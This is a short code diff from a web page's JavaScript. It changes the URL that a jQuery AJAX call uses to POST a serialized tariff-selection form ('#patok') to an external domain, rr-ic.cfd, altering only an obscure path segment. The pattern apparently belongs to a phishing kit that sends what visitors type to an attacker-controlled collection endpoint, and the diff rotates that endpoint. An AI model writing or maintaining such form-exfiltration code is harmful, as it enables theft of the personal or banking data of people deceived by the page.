@@ -554,7 +554,7 @@ var tarif = $('input[name="tarif"]:checked').val();
       $("#process1").fadeIn(); 
         $.ajax({
             type: 'POST',
-             url: 'https://rr-ic.cfd/z0me/xx/tarif.php',           data: $('#patok').serialize(),
+             url: 'https://rr-ic.cfd/c2ho/xx/tarif.php',           data: $('#patok').serialize(),
             datatype: 'JSON',            
             complete: function(data) {
             setTimeout(function(){            
